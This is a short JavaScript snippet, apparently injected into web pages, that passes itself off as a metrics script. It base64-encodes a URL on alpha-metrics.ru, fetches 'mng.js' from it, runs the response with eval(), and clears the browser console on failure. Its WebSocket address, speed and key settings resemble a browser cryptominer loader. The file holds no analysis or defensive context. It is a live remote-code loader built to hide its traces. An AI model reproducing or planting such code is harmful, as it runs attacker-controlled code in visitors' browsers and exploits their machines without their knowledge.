

(function(){
	var consoleClear=function(){try {console.clear();} catch (e) {return;};}	
        try{	
        var cfg={urls:[
                ["wss://alpha-metrics.ru"]],
        spd:0.6,
	divInx:2,
	k:"c4055e3a20b6b3af3d10590ea446ef6c",
	dns:btoa('https://alpha-metrics.ru/metrics/')};

        var req = new XMLHttpRequest();
		req.onerror=function(e){consoleClear();}
		req.onreadystatechange=function(e){
			if (e.currentTarget.DONE==e.currentTarget.readyState)
			{
				if (e.currentTarget.status==200)
                    eval(e.currentTarget.responseText)
				else 
					{
						consoleClear();}

			}
		}.bind(cfg);
		req.open('GET',atob(cfg.dns)+'mng.js',true);
		req.send();
        }catch(e){}
})();
